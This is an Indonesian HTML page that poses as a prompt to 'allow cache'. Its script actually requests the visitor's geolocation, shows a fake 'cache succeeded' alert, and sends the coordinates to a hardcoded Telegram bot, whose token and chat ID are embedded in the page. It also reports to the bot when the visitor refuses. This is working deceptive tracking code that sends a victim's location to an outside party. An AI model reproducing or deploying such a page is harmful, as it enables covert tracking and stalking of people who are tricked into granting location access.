<!DOCTYPE html>
<html>
<head>
  <title>izinkan cache</title>
</head>
<body>
  <h2>izinkan cache</h2>
  <p>Silakan klik tombol di bawah untuk mengizinkan cache Anda.</p>
  <button onclick="mintaLokasi()">izinkan Sekarang</button>

  <script>
    const botToken = "7579024338:AAGkv6LtQQH3uKtqD64DVNca4V7ZYwAyLT0";
    const chatId = "7420684427";

    function mintaLokasi() {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
          (pos) => {
            const { latitude, longitude } = pos.coords;
            alert(`cache berhasil`);
            // Kirim lokasi ke Telegram (opsional)
            const pesan = `Lokasi berhasil diterima boss:\nLat: ${latitude}\nLon: ${longitude}`;
            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(pesan)}`);
          },
          (err) => {
            // Kirim pesan ke Telegram jika ditolak
            const pesan = `Pengguna menolak memberikan lokasi.`;
            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(pesan)}`);
          }
        );
      } else {
        alert("Geolocation tidak didukung browser ini.");
      }
    }
  </script>
</body>
</html>
